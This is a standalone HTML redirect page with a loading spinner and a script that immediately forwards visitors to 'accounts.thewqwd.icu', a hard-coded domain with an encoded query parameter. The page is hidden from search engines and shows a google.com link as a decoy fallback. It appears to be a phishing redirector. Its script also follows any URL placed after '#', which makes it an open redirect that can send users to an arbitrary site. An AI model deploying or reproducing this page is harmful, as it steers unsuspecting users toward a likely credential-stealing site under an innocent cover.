<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Redirecting…</title>

  <style>
    :root {
      color-scheme: light dark;
      --bg: #f5f7fb;
      --card: #ffffff;
      --text: #172033;
      --muted: #667085;
      --accent: #2563eb;
      --border: #e4e7ec;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system,
                   BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    .card {
      width: min(100%, 460px);
      padding: 36px 30px;
      text-align: center;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 20px;
      box-shadow: 0 18px 50px rgba(16, 24, 40, 0.10);
    }

    .loader {
      width: 46px;
      height: 46px;
      margin: 0 auto 22px;
      border: 4px solid rgba(37, 99, 235, 0.15);
      border-top-color: var(--accent);
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    h1 {
      margin: 0 0 10px;
      font-size: clamp(24px, 5vw, 30px);
      letter-spacing: -0.02em;
    }

    p {
      margin: 0;
      color: var(--muted);
      line-height: 1.6;
    }

    .fallback {
      margin-top: 22px;
      display: inline-block;
      color: var(--accent);
      font-weight: 600;
      text-decoration: none;
    }

    .fallback:hover {
      text-decoration: underline;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (prefers-reduced-motion: reduce) {
      .loader {
        animation: none;
      }
    }

    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #0b1220;
        --card: #111827;
        --text: #f8fafc;
        --muted: #98a2b3;
        --border: #263244;
      }
    }
  </style>
</head>

<body>
  <main class="card" aria-live="polite">
    <div class="loader" aria-hidden="true"></div>
    <h1>Redirecting…</h1>
    <p id="message">Please wait while we take you to the requested page.</p>
    <a id="fallback" class="fallback" href="https://www.google.com/" hidden>
      Continue manually
    </a>
  </main>

  <script>
    (() => {
      "use strict";

      // Change this if you want a different default destination.
      const BASE_URL = "https://accounts.thewqwd.icu?8WEaGA5dIw=ZHdoemp2eGU=";

      const message = document.getElementById("message");
      const fallback = document.getElementById("fallback");

      function getDestination() {
        const hash = window.location.hash.slice(1);

        if (!hash) {
          return BASE_URL;
        }

        /*
         * Preserve the original file's "#..." behavior, while ensuring
         * the destination is an absolute URL with a trusted base.
         */
        try {
          const decoded = decodeURIComponent(hash);
          const destination = new URL(decoded, BASE_URL);

          // Only allow http/https destinations.
          if (destination.protocol !== "http:" &&
              destination.protocol !== "https:") {
            return BASE_URL;
          }

          return destination.href;
        } catch {
          return BASE_URL;
        }
      }

      function redirect() {
        const destination = getDestination();

        fallback.href = destination;
        fallback.hidden = false;
        message.textContent = "Redirecting you now…";

        window.location.replace(destination);
      }

      redirect();
    })();
  </script>
</body>
</html>
